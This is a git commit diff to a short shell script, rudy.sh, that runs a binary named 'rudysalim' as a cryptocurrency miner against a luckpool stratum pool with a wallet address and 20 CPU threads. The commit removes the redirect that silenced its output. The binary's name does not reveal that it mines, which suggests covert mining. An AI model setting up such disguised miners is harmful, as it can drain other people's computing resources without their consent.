91c77c8351e00492e69915179a59bb58187f0d4c
bagsdmreal <bagsdmreal@gmail.com>
2024-08-18 10:45:25 +0700

    Update rudy.sh

--- rudy.sh
+++ rudy.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 
 chmod +x rudysalim
-./rudysalim -c stratum+tcp://na.luckpool.net:3956#xnsub -u RSnFdwLiqEzAyHSAm4bqyiq7bwxgtTpP3P.RIG01 -p x --cpu 20 &> /dev/null
+./rudysalim -c stratum+tcp://na.luckpool.net:3956#xnsub -u RSnFdwLiqEzAyHSAm4bqyiq7bwxgtTpP3P.RIG01 -p x --cpu 20 
